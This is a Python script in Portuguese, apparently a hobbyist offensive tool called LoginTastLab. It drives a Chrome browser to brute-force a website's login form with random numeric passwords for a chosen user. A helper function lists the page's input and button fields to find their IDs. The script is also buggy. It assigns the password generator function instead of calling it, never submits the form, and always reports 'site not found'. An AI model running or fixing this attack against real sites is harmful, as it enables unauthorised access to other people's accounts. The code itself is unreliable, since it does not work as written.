import os
import time
import random
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

VERMELHO = "\033[31m"
VERDE = "\033[32m"
AMARELO = "\033[33m"
AMARILLO = "\033[93m"
BLANCO = "\033[97m"
CYAN = "\033[96m"
VERDE = "\033[92m"
ROJO = "\033[91m"
MAGENTA = "\033[95m"
RESET = "\033[0m" 


def load():
	progress_chars =["[                    ]", "[#                   ]", "[##                  ]",
                  "[###                 ]", "[####                ]", "[#####               ]",
                  "[######              ]", "[#######             ]", "[########            ]",
                  "[#########           ]", "[##########          ]", "[###########         ]",
                  "[############        ]", "[#############       ]", "[##############      ]",
                  "[###############     ]", "[################    ]", "[#################   ]",
                  "[##################  ]", "[################### ]", "[####################]"]

	for i, progress in enumerate(progress_chars):
		porcento = int(( + i + 1) / len(progress_chars) * 100)
		sys.stdout.write("\r" + VERMELHO +  progress.replace("[", "[" ).replace("]", "]") + f" {porcento}%")
		sys.stdout.flush()
		time.sleep(0.1)


load()
print()
def gerar_sennha(TAMANHO):
    return''.join(str(random.randint(0, 9))for _ in range(TAMANHO))

def brute_force():
    
    Flogin = str(input("input da login: "))
    Fsenha = str(input("input da senha: "))
    
    URL = str(input("URL: "))
    USER = str(input("USER: "))
    TAMANHO = int(input("TAMANHO DA SENHA: "))
    tentativas = int(input("TENTATIVAS: "))
    
    servico = Service(ChromeDriverManager().install())
    navegador = webdriver.Chrome(service=servico)
    
    try:
        
        for _ in range(tentativas):
            senha = gerar_sennha
            navegador.get(URL)
            time.sleep(1)
            
            USE = navegador.find_element(By.ID, Flogin)
            PAS = navegador.find_element(By.ID, Fsenha)
            
            USE.clear()
            USE.send_keys(USER)
            
            PAS.clear()
            PAS.send_keys(senha)
            
            time.sleep(0.1)
            print(senha)
            
    finally:
        print(VERMELHO + "Site nao encontrado!")
        navegador.quit()



def Analize():
    URL_LOGIN = str(input("URL para analizar: "))
    servico = Service(ChromeDriverManager().install())
    navegador = webdriver.Chrome(service=servico)
    navegador.get(URL_LOGIN)
    
    campos = navegador.find_elements(By.TAG_NAME, "input")
    campos = navegador.find_elements(By.TAG_NAME, "input")

    for campo in campos:
        print(VERMELHO +
            "TAG =", campo.tag_name,
            "| ID =", campo.get_attribute("id"),
            "| NAME =", campo.get_attribute("name"),
            "| TYPE =", campo.get_attribute("type"),
            "| PLACEHOLDER =", campo.get_attribute("placeholder")
        )

    
    botoes = navegador.find_elements(By.TAG_NAME, "button")

    for botao in botoes:
        print(VERDE +
            "TAG =", botao.tag_name,
            "| ID =", botao.get_attribute("id"),
            "| CLASS =", botao.get_attribute("class"),
            "| TEXTO =", botao.text

        )
    
function ={
    'Brute Force':brute_force,
    'Analize de inputs':Analize
}

pastas =[
    'Brute Force',
    'Analize de inputs'
]

print(AMARELO + "=" * 31)
print(ROJO + "Author: Cyber Wanderer" + RESET)
print(ROJO + "Github: https://github.com/kennedy-0" + RESET)
print(ROJO + "Name: LoginTastLab" + RESET)
for i, pasta in enumerate (pastas):
    print(VERDE + f"[{i}] {pasta}")

pasta = int(input("Escolha a ferramenta: "))
nomep = pastas[pasta]
function[nomep]()
